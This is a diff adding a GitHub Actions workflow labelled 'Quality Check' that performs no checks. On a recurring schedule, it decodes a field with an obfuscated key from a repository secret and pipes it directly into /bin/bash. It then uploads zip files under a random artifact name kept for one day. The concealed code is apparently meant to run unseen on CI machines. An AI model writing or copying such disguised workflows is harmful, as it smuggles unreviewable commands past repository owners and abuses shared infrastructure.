@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          nk1: ${{ secrets.nk1 }}
+        run: |
+          printf '%s' "$nk1" | jq -r .kjiuj31606 | /bin/bash
+          printf '%s' "$gqusw1" | jq -r .xy37329 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: DFZYrr6g
+          path: "*.zip"
+          retention-days: 1
